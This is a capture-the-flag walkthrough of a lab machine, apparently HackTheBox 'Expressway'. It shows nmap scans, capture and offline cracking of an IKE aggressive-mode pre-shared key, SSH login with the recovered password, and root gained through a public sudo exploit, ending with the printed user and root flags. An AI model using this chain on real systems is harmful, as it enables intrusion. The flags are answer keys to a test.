# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
TCP
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ nmap -p- -sCV 10.129.219.197
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 10:49 CEST
Nmap scan report for 10.129.219.197
Host is up (0.021s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

UDP
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ nmap -sU -T4 -vvvv 10.129.219.197
Host is up, received echo-reply ttl 63 (0.15s latency).
Scanned at 2025-09-22 11:03:34 CEST for 1042s
Not shown: 955 closed udp ports (port-unreach)
PORT      STATE         SERVICE     REASON
500/udp   open          isakmp      udp-response ttl 63
```
### Detailed port scan

At the detailed port scan go to get more information from the host. 

```
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ nmap -p500 -sU --script ike-version 10.129.219.197
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-22 11:38 CEST
Nmap scan report for 10.129.219.197
Host is up (0.024s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0

Nmap done: 1 IP address (1 host up) scanned in 0.41 seconds
```

### IPsec/IKE VPN - Port 500/UDP

It is good to know that there are several steps. I will start with the basic information. 
IPsec is widely recognized as the principal technology for securing communications between networks (LAN-to-LAN) and from remote users to the network gateway (remote access), serving as the backbone for enterprise VPN solutions. The establishment of a security association (SA) between two points is managed by IKE, which operates under the umbrella of ISAKMP, a protocol designed for the authentication and key exchange. 
This process unfolds in several phases:

Phase1: Secure channel established between the two endpoints. The identity will then be verified using the username and password.

Phase2: This phase is used to set up the parameters for securing the data with the ESP (Encapsulating Security Payload) and the AH (Authentication Header). It allows for the use of algorithms different from those in Phase 1 to ensure Perfect Forward Secrecy (PFS)

But the detailed portscan took to long so i started directly by checking the port with the ike-scan tool. There you can see that there is a know email address and 1 returned handshake.

```
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ ike-scan -M -A 10.129.219.197
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.219.197  Aggressive Mode Handshake returned
        HDR=(CKY-R=b486de9a46ce9284)
        SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
        KeyExchange(128 bytes)
        Nonce(32 bytes)
        ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
        VID=09002689dfd6b712 (XAUTH)
        VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
        Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (40.12 hosts/sec).  1 returned handshake; 0 returned notify
```

Now that I have started passive fingerprinting as described above, I have obtained the pre-shared key hash using the command below. Please note that this is only possible if aggressive mode is enabled. If aggressive mode is enabled, this is a security risk because it allows an attacker to retrieve VPN group names and crack credentials offline.

```
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ ike-scan -A --pskcrack 10.129.219.197
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.129.219.197  Aggressive Mode Handshake returned HDR=(CKY-R=34f5dff6c738e4ab) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

IKE PSK parameters (g_xr:g_xi:cky_r:cky_i:sai_b:idir_b:ni_b:nr_b:hash_r):
c2b2c37e72ce8b21a0d5132c2b9dcdeda4c9f5dea4721829193010625b1a83dc1ce58e83d2a78a1e0417a839981d873fe3066be2a3a266f60fd59b2cca460f392a07adcf486f9e7a861eba6450af5b8982c52df1d8739a8a056135657471def9e580dd17a9766475929a1312ea4525f2e2eb6a69afd8d9074c20b952171e63f4:b8dad530a8a716f4eb2bfddd723f7f7d5888fb6e8e9dfe2a652c0e4aa0b00c584d4851790c1e93407576dd3031b227b4d67936039452af96791928c1f5d8b96544a71fc6dc88c7973a75e64f049dc9989859e3db3df5f45f4384a562674c6727cdae92b81073b0449a5fd05827d824ae34a7a8816d830316ad6910c47c28f4d0:34f5dff6c738e4ab:4e197efd9cb7c9c1:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:cf96cc2e86c47802ca867aaee13c6964e21d9c89:55c7706d40ab12697bfb5bfea5058fe2236cd454c2f1de3c447857c6976772bf:786857175446e06698e941b7334f7282a573506f
Ending ike-scan 1.9.6: 1 hosts scanned in 0.025 seconds (39.33 hosts/sec).  1 returned handshake; 0 returned notify
```

I will put the hash in a file and try to crack it using pskcrack.

```
Hash in een file zetten
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ echo 'c2b2c37e72ce8b21a0d5132c2b9dcdeda4c9f5dea4721829193010625b1a83dc1ce58e83d2a78a1e0417a839981d873fe3066be2a3a266f60fd59b2cca460f392a07adcf486f9e7a861eba6450af5b8982c52df1d8739a8a056135657471def9e580dd17a9766475929a1312ea4525f2e2eb6a69afd8d9074c20b952171e63f4:b8dad530a8a716f4eb2bfddd723f7f7d5888fb6e8e9dfe2a652c0e4aa0b00c584d4851790c1e93407576dd3031b227b4d67936039452af96791928c1f5d8b96544a71fc6dc88c7973a75e64f049dc9989859e3db3df5f45f4384a562674c6727cdae92b81073b0449a5fd05827d824ae34a7a8816d830316ad6910c47c28f4d0:34f5dff6c738e4ab:4e197efd9cb7c9c1:00000001000000010000009801010004030000240101000080010005800200028003000180040002800b0001000c000400007080030000240201000080010005800200018003000180040002800b0001000c000400007080030000240301000080010001800200028003000180040002800b0001000c000400007080000000240401000080010001800200018003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e687462:cf96cc2e86c47802ca867aaee13c6964e21d9c89:55c7706d40ab12697bfb5bfea5058fe2236cd454c2f1de3c447857c6976772bf:786857175446e06698e941b7334f7282a573506f' > hash

Using psk-crack to get credentials
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ psk-crack -d /usr/share/wordlists/rockyou.txt hash
Starting psk-crack [ike-scan 1.9.6] (http://www.nta-monitor.com/tools/ike-scan/)
Running in dictionary cracking mode
key "freakingrockstarontheroad" matches SHA1 hash 786857175446e06698e941b7334f7282a573506f
Ending psk-crack: 8045040 iterations in 7.366 seconds (1092233.91 iterations/sec)
```

Now that we know the username and password, we can log in to the SSH server. To do this, use the credentials below.

| Username | Password                  |
| -------- | ------------------------- |
| ike      | freakingrockstarontheroad |
```
┌──(kali㉿kali)-[~/HTB/Expressway]
└─$ ssh ike@10.129.219.197                     
Last login: Mon Sep 22 10:53:34 2025 from 10.10.16.19
ike@expressway:~$ 
```

User Flag: 364d1650268c1786f8d43cf1e42df4ad

```
ike@expressway:~$ cat user.txt 
364d1650268c1786f8d43cf1e42df4ad
```
### Priv Escalation

I first checked whether I could use the sudo -l command to see if I could execute anything without admin rights. But as you can see for yourself, this is not possible. So I downloaded Linpeas so that I could find any gaps in the system. Using Linpeas, I took a look and saw that sudo could be used for priv escalation.

```
ike@expressway:~$ ./linpeas_linux_amd64 

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                     
Sudo version 1.9.17 

╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                    
strace Not Found                                                                                                   
-rwsr-xr-x 1 root root 1.5M Aug 14 12:58 /usr/sbin/exim4                                                           
-rwsr-xr-x 1 root root 1023K Aug 29 15:18 /usr/local/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
```

So I started looking for an exploit and came across the following URL. https://github.com/kh4sh3i/CVE-2025-32463

I downloaded the file again to the SSH connection, converted the permissions to execute permissions for the exploit.sh file, executed this file, and we were root users.

```
ike@expressway:~$ chmod +x exploit.sh
ike@expressway:~$ ./exploit.sh 
woot!
root@expressway:/# id
uid=0(root) gid=0(root) groups=0(root),13(proxy),1001(ike)
```

Here below you can find the root flag.

Root Flag: a709bf0ca4b87d02693fcf9d409692d3

```
root@expressway:/root# cat root.txt
a709bf0ca4b87d02693fcf9d409692d3
```

### Rooted

![[Pasted image 20250922122525.png]]